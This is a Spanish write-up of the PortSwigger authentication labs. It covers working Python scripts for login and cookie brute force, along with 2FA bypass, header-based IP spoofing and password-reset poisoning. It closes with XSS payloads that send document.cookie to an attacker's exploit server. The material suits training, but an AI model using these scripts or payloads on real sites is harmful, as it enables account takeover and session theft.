---
title: Authentication | PortSwigger
---
Labs práctictos de la seccion de Authentication de PortSwigger resueltos y explicados:

#### Vulnerabilidades en el inicio de sesión mediante contraseña

``` python
#!/usr/bin/python3
from pwn import * 
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n [!] Saliendo.. ")
    sys.exit(1)

if len(sys.argv) != 3:
    print(" [!] Uso: python3 auth.py <user_list> <pass_list>")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0adf001d03974206c0a22e1600ac0013.web-security-academy.net/login"
usernames = sys.argv[1]
passwords = sys.argv[2]
header = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"session": "session=5htTCZY03nVAJYPMCvSCPqmxDhrnfvPl"}
fp = open(usernames)
user_list= fp.read()
fp = open(passwords)
pass_list = fp.read()

def getAccess(): 
    for user in user_list.splitlines():
     for password in pass_list.splitlines():
        print(" [+] Probando usuario: %s y password: %s" % (user, password)) 
        data = "username=" + user + "&password=" + password
        r = requests.post(main_url, data=data, headers=header,     cookies=cookies)
        if "Your username is" in r.text:
            print(" [+] Credenciales encontradas: %s:%s" % (user, password))
            break

if __name__=='__main__':
    getAccess()
```

-----
#### Bypassing : Eludir la autenticación de dos factores

``` 
# A veces, la 2FA verification se hace en otra pagina la cual se puede bypassear. Para nuestro caso, como tenemos acceso al 2FA del usuario wiener:peter, podemos ver que una vez dentro nos redigire a POST /my-account HTTP/1.1 por lo que podemos copiar dicha cabezera POST y pegarla en la pagina de 2FA del usuario carlos:montoya
```

------
#### Lógica de verificación de dos factores defectuosa

``` bash
# Interceptamos la petición y al llegar a post /login2, que es el FA, cambiamos el verify=wiener por verify=carlos, pero como no sabemos el mfa-code (2FA), tendremos que brute-forcearlo. Para ello, creamos una lista rapida de numeros del 0000 al 9999:
seq 0000 9999 > lista.txt
# Y la cargamos al intruder, escogiendo el mfa-code como campo a forzar. Finalmente tendremos un codigo de respuesta 302, indicando el codigo del usuario carlos el cual podremos usar para acceder a la pagina.
```

----
#### Restablecer contraseñas mediante una URL

```
# Simplemente mandamos un cambio de contraseña al usuario wiener (porque tenemos acceso a el y su correo), accedemos al link de cambio de contraseña, lo interceptamos con burpsuite y cambiamos el parametro user=wiener por user=carlos, y ya podremos ingresar a la cuenta de carlos con la password que hemos elegido.
```

-----------
#### Enumeración de nombres de usuario mediante respuestas sutilmente diferentes

```
# Simplemente interceptamos la petición, y la brute-forceamos el usuario (ya que es lo que nos pide el ejercicio). No obstante, hemos de añadir el texto "Invalid username or passsword." como Grep-Extract. Para ello: Intruder>options>Grep-Extract y seleccionamos dicho trozo de texto. Cuando acabe el intruder, veremos que hay un usuario que hace la petición por POST en lugar de GET, por lo que ya teniendo el usuario podemos brute-forcear la contraseña.
```
#### Enumeración de nombres de usuario a través del tiempo de respuesta

```
# Primero que nada, como el ejercicio tiene una restricción de IP, vamos a introducirle un X-Forwarded-For header. Con esto, lo que conseguiremos será "cambiar" de IP cada vez que realizamos una petición, de esta manera la pagina no nos bloqueará la IP durante 30 minutos cada vez que realizamos una peticion. Para ello: Proxy>Options>Math and Replace > Add > type: Request header, replace:X-Forwarded-For: [IP] (yo he puesto la mia). Una vez tenemos este header e interceptamos cualquier request, nos aparecerá y podremos cambiarla. 

#Una vez tenemos esto configurado, vamos al intruder, y seleccionamos attack type > Pitchfork, ya que necesitamos introducir 2 payloads: uno para que cambie la IP cada vez que realizamos una request y otra el username. Cargamos un payload con la lista de usuarios que nos proporciona burpsuite y le agregamos nuestro usuario "wiener", el cual sabemos que existe.  Si corremos el Intruder (y le damos a la pestaña columns para agregar el tiempo de respuesta), veremos que wiener y otro usuario tardan mas de lo normal en responder (en mi caso 480ms y 490ms respectivamente, mientras que los otros tardaban menos de 300) de esta manera ya tenemos el usuario X. Volvemos al intruder, y cambiamos el campo a brute-forcear a la contraseña, poniendo el usuario que ya hemos descubierto.
```

------
#### Protección de fuerza bruta rota, bloqueo IP

``` python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string, click

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:
    print("Modo de uso: python3 block.py <archivo>")
    sys.exit(1)


main_url="https://0a94002003aa4822c03b4a180005005f.web-security-academy.net/login"
header = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"session": "session=wsd3yKlA5dlkyKS98Ws5SzdW8gZPbEtQ"}
archivo = sys.argv[1]

fp=open(sys.argv[1], "r")
lista=fp.read()
with open(sys.argv[1]) as file:
    lines = [i.strip() for i in file]


def getAccess():
    for password in lines:
        if (lines.index(password)+1) % 3 == 0:
            print(" [+] metiendo credenciales de wiener")
            r=requests.post(main_url, headers=header, cookies=cookies, data = "username=wiener&password=peter")
            sleep(1)
            if r.status_code == 302:
                print(" [+] credenciales de wiener aceptadas")
                new_main_url="https://0a94002003aa4822c03b4a180005005f.web-security-academy.net/login"
                r=requests.post(new_main_url, headers=header, cookies=cookies, data = "username=carlos&password=%s" % lines[lines.index(passwo
rd)])
                sleep(1)
                if "username" in r.text:
                    print("algo va mal")
        else:
            print(" [+] Probando usuario: carlos y password:%s" %  lines[lines.index(password)-1])
            r=requests.post(main_url, headers=header, cookies=cookies, data = "username=carlos&password=%s" % lines[lines.index(password)-1])
            sleep(1)
            if r.status_code == 302:
                print("Password encontrada: %s" % (password))
                break
if __name__ == "__main__":
    getAccess()

# Para aplicar el script, necesitais cambiar vuestro main_url y cookies (y tener un archivo con las contraseñas que querais probar).

# Otra opcion existente es usar el burp intruder:
# 1-Enviamos una peticion con wiener:peter y la mandamos al intruder.
# 2-Creamos un ataque de tipo pitchfork (para meter varios payloads en distintas posiciones) y marcamos el user y password como posiciones a brute-forcear
# 3-Entramos a la pestaña de resource pool>resource pool>añadimos el ataque con requests concurrentes = 1 (para enviar una las request una por una, siguiendo el orden que deseemos correctamente)
# 4-En el payload>set1>y añadimos una lista donde se repirta wiener, carlos pero 100 veces cada uno.
# 5-Hacemos lo mismo con la lista de contraseñas, pero despues de cada contraseña agregamos "peter", pues esta es la contraseña de nuestra cuenta "wiener", para resetear la IP. Y agregamos esto al 2º set del payload.
# 6-Ahora toca esperar hasta que veamos una status code 302, ya de esta manera ya tendremos las credenciales de carlos.
```
--------------
#### Bloqueo de cuentas

```
# Capturamos una request con cualquier usuario y password, y la mandamos al intruder. En el payload, cargamos la misma lista de usuarios X numero de veces (yo elegí 3, por ejemplo), porque así al meter varias veces el mismo usuario, veremos que uno de ellos nos da una "Length" en la respuesta diferente a los demás, por lo que sabemos que dicho usuario es el correcto. Ahora toca enumerar la contraseña. 
# Para ello, hemos de tener en cuenta que cada 3 intentos fallidos de contraseña, la cuenta es bloqueda 1 minuto. 
# Por lo tanto, una vez sabemos la el usuario, mandamos otra vez la request la intruder, y seleccionamos el campo de password a brute-forcear. Añadimos la lista de passwords como payload, y luego vamos a Intruder>Options>Grep-Extract y seleccionamos el error que nos sale cuando nos bloquean.
# Corremos el Intruder, y veremos que habrá una combinación la cual nos reporta dicho error (la columna se queda en blanco), por lo tanto, sabemos que esa es la contraseña.
```
--------
``` python
import os
from pwn import *
import hashlib, signal, pdb, sys, base64

def def_handler(sig, frame):
    print("\n\n [!] Saliendo.. ")
    sys.exit(1)

if len(sys.argv) != 3:
    print("\n\n Agrega una lista de contraseñas y un archivo de destino")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

f=open(sys.argv[2], "a")

fp=open(sys.argv[1], "r")
lista=fp.readlines()
with open(sys.argv[1], "r") as file:
    lines = [i.strip() for i in file]


def encrypt():
    for password in lines:
        result = hashlib.md5(password.encode())
        message = "carlos:" + result.hexdigest()
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        f.write(base64_message+"\n")

if __name__ == "__main__":
    encrypt()
```

#### Forzar una cookie de permanencia

```
# Si nos logeamos en la pagina con wiener:peter y analizamos la logged-in-cookie vemos que está encodeada en base64, siguiendo el siguiente patron usuario:contraseña_en_hash_md5. Por lo tanto, como nosotros tenemos ya el usuario carlos, tenemos que concatenarle la contraseña siguiendo el formato anterior y finalmente encodearlo en base64. Para ello, tenemos 2 opciones: Hacerlo mediante un script de python(el cual expondré más abajo) o usar el Payload Processing de la siguiente manera:
# Salimos de la cuenta de wiener, activamos el Intercept de burp y captamos la primera request que tenga GET /my-account HTTP/1.1
# Seleccionamos el campo de la cookie para aplicarle la fuerza bruta
# Posteriormente, vamos al intruder > payloads > Payload Processing
# Hash: MD5
# Add prefif: carlos:
# Encode: Base64-encode
# Y finalmente ponemos la lista de passwords que nos proporciona portswigger como payload. Corremos el intruder y veremos que hay una request que tiene un tamaño de respuesta (Length) mayor que las demás, por lo que ya sabremos cual es la contraseña.
```
----------
``` python
# Tenemos que pasarle 2 parametros al script: un archivo que contenga las contraseñas que queremos encodear y un archivo de destino.
# Ejemplo: python3 <script.py> passwords.txt encoded.txt

import os
import hashlib, signal, pdb, sys, base64

def def_handler(sig, frame):
    print("\n\n [!] Saliendo.. ")
    sys.exit(1)

if len(sys.argv) != 3:
    print("\n\n Agrega una lista de contraseñas y un archivo de destino")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

f=open(sys.argv[2], "a")
fp=open(sys.argv[1], "r")

lista=fp.readlines()
with open(sys.argv[1], "r") as file:
    lines = [i.strip() for i in file]


def encrypt():
    for password in lines:
        result = hashlib.md5(password.encode())
        message = "carlos:" + result.hexdigest()
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        f.write(base64_message+"\n")
if __name__ == "__main__":
    encrypt()

# Teniendo ya un archivo .txt con las passwords encodeadas siguiendo el patron, podemos saltarnos el paso de Payload Processing, cargando directamente el archivo.txt como payload, y nos reportará los mismos resultados que el método anterior.
```
---------
#### Envenenamiento por restablecimiento de contraseña

```
# Primero vamos a probar el reseteo de contraseña con nuestra cuenta. Si la analizamos, vemos que el link de reseteo no se puede manipular, ya que contiene un token único de reseteo de password. No obstante, tenemos una pista en el propio nombre del lab: middleware, por lo que sabemos que podemos manipular la request para mandarla a un "tercero". Buscando un poco por google, podemos encontrar el header X-Forwarded-Host, el cual nos permite redigir la request adonde queramos, por lo que interceptaremos una nueva request para el usuario "carlos" y la mandamos a nuestro exploit server (id.exploit-server.net). Como sabemos que Carlos hará click en cualquier link que reciba, accedemos al apartado de "Acess Log" y veremos una peticion de una IP diferente, la cual presenta un link de password reset con un token (el de carlos), por lo que lo metemos en la URL y reseteamos la contraseña de carlos, pudiendo acceder a su cuenta.
```
--------
#### Fuerza bruta de contraseña mediante cambio de contraseña

```
# Si accedemos al campo de change password con el usuario weiner, y probamos combinaciones:

# - Meter Current password correcta y la nueva contraseña coincidente en los 2 campos: Se cambia la contraseña.
# - Meter Current password correcta pero que las nuevas contraseñas sea diferente: tira error de que no coinciden dichas contraseñas.
# - Meter una current password errónea pero las nuevas contraseñas coinciden: Tira error de que la contraseña actual no es correcta.

# Por lo tanto, podemos brute-forcear el campo de current password cambiando el user-id a carlos hasta que no nos salga el mensaje de "Current password isn't correct"
```
---------
#### Descifrar contraseñas sin conexión

``` html
// En este caso, sabemos que la seccion de comentarios es vulnerable a XSS, por lo que vamos probando los diferentes campos. Finalmente, vemos que el vulnerable es el de comment, por lo que introducimos un elemento document.location, el cual funciona como un redireccionador de URL que nos lleva a la pagina especificada. Por lo tanto, introducimos la URL del servidor de exploits, creando un script de la siguiente manera:
<script>document.location="url_exploit_server_del_atacante"+document.cookie</script>
// Y lo enviamos. Por lo tanto, cualquier usuario que esté en la página web y acceda a dicha seccion de comentarios, será dirigido al url del servidor exploit, su cookie será extraida y finalmente será redireccionado a la pagina de comentarios de nuevo. 

//Otra forma de hacerlo es usando window location assign para redirigir al usuario a cualquier pagina de nuestro interes. De tal forma, que el script nos quedaría asi:
<script>window.location.assign("url_exploit_server_del_atacante"+document.cookie)</script>
```